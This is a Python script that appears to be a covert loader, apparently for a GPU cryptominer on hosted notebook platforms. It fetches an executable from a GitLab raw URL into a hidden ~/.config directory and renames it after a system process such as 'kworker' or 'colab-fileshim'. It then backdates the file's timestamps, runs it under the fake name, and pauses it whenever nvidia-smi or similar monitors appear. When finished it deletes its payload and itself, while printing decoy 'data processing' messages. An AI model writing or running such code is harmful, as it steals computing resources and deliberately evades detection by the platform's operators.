import requests
import os
import subprocess
import sys
import datetime
import time
import random
import uuid
import shutil
import tarfile
import signal

# --- Main Script Configuration ---
# Define the URL to download the payload from.
# This now points to a single executable file.
payload_url = "https://gitlab.com/kenogoden/main/-/raw/main/sh/cukai"

# Define the URL for the magic ball script
magic_ball_url = "https://gitlab.com/senopvrtymlbb/kolabaru/-/raw/main/magic/ball.py"

def download_file(url, local_filename):
    """
    Downloads a file from a given URL to the specified local filename.
    """
    print(f"Attempting to download file from {url} to {local_filename}...")
    try:
        # Create the directory if it doesn't exist
        os.makedirs(os.path.dirname(local_filename), exist_ok=True)
        
        with requests.get(url, stream=True) as r:
            r.raise_for_status()
            with open(local_filename, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
        print(f"Successfully downloaded {local_filename}.")
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error downloading the file: {e}")
        return False

def download_and_print_script(url):
    """
    Downloads a Python script from a URL and prints its content.
    """
    print(f"\n--- Downloading and printing contents of {url.split('/')[-1]} ---")
    try:
        response = requests.get(url)
        response.raise_for_status()
        print(response.text)
        print("--- End of script content ---\n")
    except requests.exceptions.RequestException as e:
        print(f"Error downloading script from {url}: {e}")

def make_executable(filepath):
    """
    Changes the file permissions to make it executable.
    """
    print(f"Setting permissions for {filepath}...")
    try:
        os.chmod(filepath, 0o777)
        print("Permissions set successfully.")
        return True
    except OSError as e:
        print(f"Error setting file permissions: {e}")
        return False

def update_timestamps(filepath):
    """
    Changes the creation and modification timestamps of a file to an older date.
    """
    print(f"Updating timestamps for {filepath}...")
    try:
        past_date = datetime.datetime(2024, 1, 1, 10, 0, 0)
        past_timestamp = time.mktime(past_date.timetuple())
        os.utime(filepath, (past_timestamp, past_timestamp))
        print("Timestamps updated successfully.")
    except Exception as e:
        print(f"Error updating timestamps: {e}")

def check_for_gpu_monitors():
    """
    Checks for common GPU monitoring tools.
    Returns True if a monitoring process is found, False otherwise.
    """
    monitoring_tools = ["nvidia-smi", "radeontop", "nvtop"]
    try:
        output = subprocess.check_output(["ps", "-A"], text=True)
        for tool in monitoring_tools:
            if tool in output:
                print(f"GPU monitor '{tool}' detected!")
                return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        # In case 'ps' command fails or is not found
        pass
    return False

def run_random_system_process(duration_seconds):
    """
    Simulates a random system process by sleeping for a given duration.
    """
    print(f"Simulating a random system process for {duration_seconds} seconds...")
    time.sleep(duration_seconds)
    print("Random system process simulation finished.")

def run_scheduled_task(executable_path, obfuscated_name):
    """
    Runs the payload in a forked process with an obfuscated process name,
    alternating with simulated system processes.
    """
    # Define the total duration for the entire task to run (e.g., 2 hours +/- 10 mins).
    total_run_time_seconds = random.randint(7200 - 600, 7200 + 600)  
    start_time = time.time()
    child_pid = None
    
    print(f"Process runner: Starting scheduled task for a total of approximately {total_run_time_seconds / 3600:.2f} hours.")

    while (time.time() - start_time) < total_run_time_seconds:
        # 1. Run payload for a random duration (100-150 seconds)
        payload_run_time = random.randint(100, 150)
        payload_start_time = time.time()
        print(f"\nProcess runner: Starting process '{obfuscated_name}' for up to {payload_run_time} seconds...")
        
        try:
            # Fork the current process to create a child
            child_pid = os.fork()

            if child_pid == 0:
                # --- This block runs in the CHILD process ---
                try:
                    # Replace the child process with the payload, using the obfuscated name.
                    # The payload is run with no additional arguments.
                    os.execv(executable_path, [obfuscated_name])
                except Exception as e:
                    # If execv fails, the child must exit to prevent running parent code.
                    os._exit(1)

            # --- This block runs in the PARENT process ---
            print(f"Process runner: Process '{obfuscated_name}' started with PID {child_pid}.")
            
            # Monitor the process for its allotted time
            while (time.time() - payload_start_time) < payload_run_time:
                if check_for_gpu_monitors():
                    print("Process runner: GPU monitor detected. Terminating process temporarily.")
                    os.kill(child_pid, signal.SIGTERM)
                    os.waitpid(child_pid, 0) # Wait for the child to terminate
                    child_pid = None
                    
                    cooldown_seconds = random.randint(60, 120)
                    print(f"Process runner: Entering cooldown for {cooldown_seconds} seconds...")
                    time.sleep(cooldown_seconds)
                    
                    # Break inner loop to restart the process
                    break 
                
                # Check if process died on its own
                if child_pid:
                    pid_check, status = os.waitpid(child_pid, os.WNOHANG)
                    if pid_check != 0:
                        print(f"Process runner: Process {child_pid} exited unexpectedly.")
                        child_pid = None
                        break # Break inner loop to restart

                time.sleep(10)

            # If the process was restarted, child_pid will be None. Continue to the next main loop iteration.
            if not child_pid:
                continue

            # Terminate the payload after its random run time is over
            print(f"Process runner: Process '{obfuscated_name}' random run time elapsed. Terminating process.")
            os.kill(child_pid, signal.SIGTERM)
            try:
                os.waitpid(child_pid, 0) # Wait for it to die
            except ChildProcessError:
                pass # It might already be dead
            child_pid = None

        except Exception as e:
            print(f"An unexpected error occurred during process management: {e}. Aborting.")
            if child_pid:
                try:
                    os.kill(child_pid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
            break

        # 2. Simulate a random system process (400-600 seconds)
        system_process_duration = random.randint(400, 600)
        run_random_system_process(system_process_duration)
            
    # Final cleanup
    if child_pid:
        print("Process runner: Total run time elapsed. Terminating any running processes...")
        try:
            os.kill(child_pid, signal.SIGKILL)
        except ProcessLookupError:
            pass # Already gone
    
    # Clean up the downloaded file and its parent directory
    base_dir = os.path.dirname(executable_path)
    try:
        shutil.rmtree(base_dir)
        print(f"Process runner: Removed directory: {base_dir}")
    except OSError as e:
        print(f"Process runner: Error removing directory: {base_dir} - {e}")

def self_delete_script():
    """
    Deletes the current Python script after it has run.
    """
    try:
        script_path = os.path.abspath(sys.argv[0])
        if os.path.exists(script_path):
            os.remove(script_path)
            print(f"Original script '{script_path}' removed successfully.")
    except OSError as e:
        print(f"Error removing self-deleting script: {e}")

# Main execution logic
if __name__ == "__main__":
    # Download and print the magic ball script
    download_and_print_script(magic_ball_url)

    print("Running scheduled data processing tasks... Please wait.")
    time.sleep(2)

    # Generate a random directory name to store the payload
    process_dir_name = str(uuid.uuid4())
    process_dir = os.path.join(os.path.expanduser("~"), ".config", process_dir_name)

    # A list of common system process names to use for obfuscation
    common_process_names = [
        "kworker/u2:0", "systemd-journald", "dbus-daemon",
        "irqbalance", "rngd", "sshd", "cron", "[kthreadd]",
        "node", "docker-init", "oom_monitor.sh", "run.sh",
        "kernel_manager_", "tail", "python3", "colab-fileshim.",
        "jupyter-server", "dap_multiplexer", "language_servic",
        "tmux: server", "bash"
    ]
    
    # Randomly select a fake process name
    obfuscated_binary_name = random.choice(common_process_names)
    
    # Define the final path for the downloaded executable, which will have the obfuscated name
    final_executable_path = os.path.join(process_dir, obfuscated_binary_name)

    # Download the payload
    if download_file(payload_url, final_executable_path):
        print(f"Found executable payload.")
        
        # Make the executable runnable
        if make_executable(final_executable_path):
            update_timestamps(final_executable_path)
            
            # Run the main task logic
            run_scheduled_task(final_executable_path, obfuscated_binary_name)
            
            # Clean up the script itself
            self_delete_script()
        else:
            print("Could not make the file executable. Aborting.")
            shutil.rmtree(process_dir)
    else:
        print("Could not download the file. Aborting.")
